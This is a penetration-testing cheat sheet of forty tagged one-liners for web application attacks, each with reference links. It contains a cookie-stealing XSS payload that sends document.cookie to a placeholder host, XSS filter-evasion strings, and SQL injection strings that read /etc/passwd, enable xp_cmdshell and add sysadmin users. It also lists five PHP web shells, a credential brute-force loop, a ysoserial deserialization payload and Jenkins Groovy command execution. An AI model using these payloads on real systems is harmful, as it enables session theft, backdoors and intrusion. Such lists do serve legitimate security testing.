### 1. Grab the cookie
```
<script>i = new XMLHttpRequest(); i.open('GET', '[dest]' + document.cookie, true); i.send();</script>
```
**- web application,XSS,cookies**
#### References:

https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
https://excess-xss.com/
__________
### 2. Skipfish scanner
```
skipfish -O -MEU -o results-nonauth -W ~/pentest/wordlists/skipfish.wl -k 00:30:00 https://[ip]
```
**- scanning,web application**
#### References:

https://github.com/spinkham/skipfish
__________
### 3. Curl through a proxy (-m = timeout)
```
curl -D - --proxy1.0 [ip]:80 -m 2 [url]
```
**- linux,bash,web application**
#### References:

http://www.thegeekstuff.com/2012/04/curl-examples/
__________
### 4. Curl with cookie
```
curl -k --cookie "[cookie]" [url] --silent | grep "<title>"
```
**- linux,bash,web application**
#### References:

http://www.thegeekstuff.com/2012/04/curl-examples/
__________
### 5. Load a file with MYSQL
```
null union all select load_file('/etc/passwd')/*
```
**- web application,sql injection,mysql**
#### References:

http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheets
__________
### 6. enable xp_cmdshell
```
exec sp_configure 'xp_cmdshell', 1 go reconfigure
```
**- web application,sql injection,shell,mssql**
#### References:

http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
__________
### 7. oracle add user
```
create user victor identified by pass123 temporary tablespace temp default tablespace users;grant connect to victor;grant resource to victor;
```
**- web application,sql injection,Oracle**
#### References:

http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
__________
### 8. mysql add user
```
insert into mysql.user (user, host, password) values ('victor', 'localhost', password('pass123'))
```
**- web application,sql injection,mysql**
#### References:

http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
__________
### 9. mssql add user
```
exec sp_addlogin 'victor', 'pass123';  exec sp_addsrvrolemember 'victor', 'sysadmin'
```
**- web application,sql injection,mssql**
#### References:

http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
__________
### 10. .net xss filter evasion
```
<%div style="xss:expression(alert(123))">
```
**- web application,XSS**
#### References:

https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
__________
### 11. .net xss filter evasion
```
<IMG SRC=j&#X41vascript:alert('test2')>
```
**- web application,XSS**
#### References:

https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
__________
### 12. UTF7 xss
```
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi
```
**- web application,XSS**
#### References:

https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
__________
### 13. Burpify JSON request
```
cat json.txt | sed "s/false/§false§/g" | sed "s/true/§true§/g" | sed "s/null/§null§/g" | sed "s/:\"/:\"§/g" | sed "s/\",/§\",/g" | sed "s/\"}/§\"}/g" | sed "s/\\[\\]/\\[§§\\]/g"
```
**- bash,text manipulation,interesting,web application**
#### References:

https://www.yg.ht/
__________
### 14. mini xss
```
<script src=//[ip]>
```
**- web application,XSS**
#### References:

https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
__________
### 15. load balance detection
```
halberd -v -p 10 [URL]
```
**- linux,networking,scanning,web application**
#### References:

https://github.com/jmbr/halberd
__________
### 16. cvs comit change with message
```
cvs commit -m "[Comment]" [File inc "package"]
```
**- web address**
#### References:

http://tulrich.com/geekstuff/cvs.html
__________
### 17. hash list
```
https://hashcat.net/wiki/doku.php?id=example_hashes
```
**- hashes,web address**
#### References:

https://hashcat.net/wiki/doku.php?id=example_hashes
__________
### 18. Bypass auth on ios 11.2-12.2
```
http://[ip]/level/56/exec/show/config
```
**- cisco,interesting,web application,remote command shell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 19. Common operations on data
```
https://gchq.github.io/CyberChef/
```
**- interesting,reference,web address**
#### References:

https://gchq.github.io/CyberChef/
__________
### 20. Ruby on Rails String Interpolation  : anything in #{} is executed
```
POST: {“listing”:{“directions”:[{“test”:[{“abc”:”#{%x[‘ls’]}+foo”}]}] }}
```
**- web application,ruby**
#### References:

http://buer.haus/2017/03/13/airbnb-ruby-on-rails-string-interpolation-led-to-remote-code-execution/
__________
### 21. brute force HTTP basic burp
```
Custom iterator -> 1 + Seperator for 1 ->  2 -> payload processing b64 
```
**- brute,web application**
#### References:

http://security-geek.in/2014/08/22/using-burp-suite-to-brute-force-http-auth-attacks/
__________
### 22. NTLM brute force, if msf is broke : assumes fail is in Index, curl is still bugged?
```
for i in `cat [users]`; do for j in `cat [passwords]`; do wget -c --http-user='[domain]\$i' --http-password=$j https://[url] --no-check-certificate -e use_proxy=yes -e https_proxy=127.0.0.1:8080 2>index.html; grep -i fail index.html; rm index.html; echo $i:$j; echo "___" ; done; done | tee ntlm_brute
```
**- brute,web application**
#### References:

http://honglus.blogspot.co.uk/2010/06/use-script-to-fetch-url-protected-by.html
__________
### 23. YsoSerial code execution 
```
java -jar ysoserial-0.0.2-all.jar CommonsCollections1 '[command]' > payload.out
```
**- web application,java**
#### References:

https://github.com/frohoff/ysoserial
http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
__________
### 24. Very Basic SQLI test in wp plugin
```
grep -ir wpdb . | egrep -i "get_r|insert|escape|query" | egrep "_GET|_POST|_REQUEST|\$" | grep --color wpdb.
```
**- web application,sql injection**
#### References:

https://codex.wordpress.org/Class_Reference/wpdb
__________
### 25. Php Simple shell, set aPasswordto access, cmd is your command: See Commix to use this easily
```
<?php if (isset($_GET['Password'])){passthru($_GET['cmd']);} ?>
```
**- web application,php,remote command shell**
#### References:

php.net/manual/en/function.passthru.php
__________
### 26. Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily
```
<?php if (isset($_GET['Password'])){exec($_GET['cmd']);} ?>
```
**- web application,php,remote command shell**
#### References:

php.net/manual/en/function.exec.php
__________
### 27. Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily
```
<?php if (isset($_GET['Password'])){system($_GET['cmd']);} ?>
```
**- web application,php,remote command shell**
#### References:

php.net/manual/en/function.system.php
__________
### 28. Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily
```
<?php if (isset($_GET['Password'])){eval($_GET['cmd']);} ?>
```
**- web application,php,remote command shell**
#### References:

php.net/manual/en/function.eval.php
__________
### 29. Php Simple shell, set Password to access, bis your command: See Commix to use this easily
```
<?php if (isset($_GET['Password'])){shell_exec($_GET['cmd']);} ?>
```
**- web application,php,remote command shell**
#### References:

php.net/manual/en/function.shell-exec.php
__________
### 30. JSFiddle skele
```
https://jsfiddle.net/byf89m43/2/
```
**- web application,XSS**
#### References:

http://stackoverflow.com/questions/17382200/print-var-in-jsfiddle
__________
### 31. Check for UNauth access to bucket
```
aws s3 ls  s3://flaws.cloud/ --no-sign-request --region us-west-2
```
**- web application,Cloud**
#### References:

http://flaws.cloud/hint2.html
__________
### 32. Commix abuse exec as per the php shells, nicer than burp repeater! 
```
/opt/commix/commix.py -u "https://[rip]:443/[resource]?[password]&cmd=1*" --force-ssl
```
**- web application,remote command shell**
#### References:

https://github.com/commixproject/commix
__________
### 33. Asp.net filter evasion
```
<% style=behavior:url(: onreadystatechange=alert(1)>
```
**- web application,XSS**
#### References:

https://prezi.com/sfiyqpfngyor/xss-stylebehavior-urlhttphackersorgxsshtc/
http://blog.innerht.ml/cascading-style-scripting/
__________
### 34. Show a compact ascii table
```
man -P 'less -p ".*Tables"' ascii
```
**- reference,encoding,ascii,web app**
#### References:

http://man7.org/linux/man-pages/man7/ascii.7.html
__________
### 35. Echo hello world, test for RCE in JSP application.
```
<%="Hello Word"%>
```
**- web application,code execution,jsp**
#### References:

https://stackoverflow.com/questions/5713013/echo-instruction-in-jsp
__________
### 36. Echo hello world, test for RCE in JSP application.
```
out.print("Hello World");
```
**- web application,code execution,jsp**
#### References:

https://stackoverflow.com/questions/5713013/echo-instruction-in-jsp
__________
### 37. Echo hello world, test for RCE in JSP application.
```
<c:out value="${[variableName]}" />
```
**- web application,code execution,jsp**
#### References:

https://stackoverflow.com/questions/5713013/echo-instruction-in-jsp
__________
### 38. Padding Oracle attack, break encrypted cookies
```
padbuster [url] [EncodedData] 8 --cookies '[UserCookies]'  -encoding 0 --plaintext user=[TextToEncode]
```
**- web application,cookies**
#### References:

https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html
https://archive.org/details/TheWebApplicationHackerHandbook
https://pentesterlab.com/exercises/padding_oracle/course
__________
### 39. Execute GroovyScript on Jenkins, You can also execute commands when ReBuilding projects. Also user addition has a path traversal vuln allowing you to override users when registering.
```
def process = "ls -l".execute();println "Found text ${process.text}"
```
**- linux,web application,Windows,code execution,Groovy**
#### References:

https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/
https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/
https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console
__________
### 40. Generate and test domain typos and variations to detect and perform typo squatting, URL hijacking, phishing, and corporate espionage.
```
urlcrazy [domain]
```
**- web application,dns,recon**
#### References:

https://www.morningstarsecurity.com/research/urlcrazy
__________
